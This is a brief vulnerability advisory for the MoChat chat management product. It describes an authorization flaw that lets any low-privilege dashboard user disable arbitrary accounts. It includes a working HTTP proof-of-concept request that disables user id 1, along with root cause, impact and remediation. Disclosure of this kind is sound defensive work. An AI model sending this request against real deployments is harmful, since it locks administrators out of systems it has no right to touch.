# MoChat — 任意用户禁用 IDOR（PUT /dashboard/user/statusUpdate） (MC-VULN-004)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Improper Authorization |
| **CWE** | CWE-639 |
| **Authentication** | Any authenticated dashboard user |

## Summary

Low-privilege user can disable arbitrary accounts via `PUT /dashboard/user/statusUpdate` with `userId` list. No PermissionMiddleware or tenant scope.

## Root cause

`StatusUpdate.php` + `UserService::updateUserStatusById()` global `whereIn(id)`.

## Proof of Concept

```http
PUT /dashboard/user/statusUpdate HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer LOW_PRIV_TOKEN
Content-Type: application/json
Connection: close

{"userId":"1","status":2}
```

**Expected:** HTTP 200; `mc_user.status` for id=1 becomes 2 (disabled)

## Impact

Denial of service / lockout of administrators.

## Remediation

Tenant-scoped updates + PermissionMiddleware.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-004
- PoC: `POC_VERIFICATION_REPORT.md`
